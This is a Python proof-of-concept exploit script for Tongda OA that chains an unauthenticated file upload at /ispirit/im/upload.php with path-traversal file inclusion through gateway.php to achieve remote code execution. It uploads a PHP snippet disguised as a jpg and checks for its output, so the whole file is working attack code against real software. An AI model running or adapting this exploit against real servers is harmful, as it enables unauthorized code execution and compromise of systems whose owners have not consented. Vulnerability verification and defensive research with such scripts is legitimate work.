#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
# author: Chaser
# 通达OA未授权任意文件上传及文件包含导致远程代码执行漏洞
# usage: python tongda_oa_2020_rce.py [target_url]
# 参考链接：https://www.anquanke.com/post/id/201174

import sys
import requests
import hashlib
import random
import re


def upload_file(url):
    upload_url = f'{url}/ispirit/im/upload.php'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537 (KHTML, like Gecko) Chrome/62 Safari/537",
        "X-Forwarded-For": "127.0.0.1",
        "Content-Type": "multipart/form-data; boundary=----WebkitformBoudaryU1r1cBFuRnJ6Botb"
    }
    payload = f'------WebkitformBoudaryU1r1cBFuRnJ6Botb\r\nContent-Disposition: form-data; name="UPLOAD_MODE"\r\n' \
        f'\r\n2\r\n------WebkitformBoudaryU1r1cBFuRnJ6Botb\r\nContent-Disposition: form-data; name="P"\r\n\r\n123\r\n' \
        f'------WebkitformBoudaryU1r1cBFuRnJ6Botb\r\nContent-Disposition: form-data; name="DEST_UID"\r\n\r\n1\r\n' \
        f'------WebkitformBoudaryU1r1cBFuRnJ6Botb\r\nContent-Disposition: form-data; name="ATTACHMENT";\r\n' \
        f'filename="jpg"\r\nContent-Type:image/jpg\r\n\r\n' \
        f'<?php echo md5({random_num});?>\r\n------WebkitformBoudaryU1r1cBFuRnJ6Botb'
    content = requests.post(upload_url, data=payload, headers=headers, proxies=proxies)
    file_name = re.findall(r"2003_(.+?)\|", content.text)[0]
    return file_name


def proof(file_name):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537 (KHTML, like Gecko) Chrome/62 Safari/537",
        "X-Forwarded-For": "127.0.0.1",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    proof_data = 'json={"url":"/general/../../attach/im/2003/%s.jpg"} ' % file_name
    vul_url = f'{url}/ispirit/interface/gateway.php'
    vul_url2 = f'{url}/mac/gateway.php'
    content = requests.post(vul_url, data=proof_data, headers=headers, proxies=proxies)
    if content.status_code != 200:
        content = requests.post(vul_url2, data=proof_data, headers=headers, proxies=proxies)
    if hashlib.md5(b'%d' % random_num).hexdigest() in content.text:
        return True
    else:
        return False


if __name__ == '__main__':
    url = sys.argv[1]
    try:
        random_num = random.randint(1, 100)
        proxies = {"http": "http://127.0.0.1:8080"}
        file_name = upload_file(url)

        if file_name:
            result = proof(file_name)
            if result:
                print('[*] This target is vulnerable!')
            else:
                print('[*] This target is not vulnerable!')
        else:
            print('[*] This target is not vulnerable!')
    except:
        print('[!] Something wrong!')
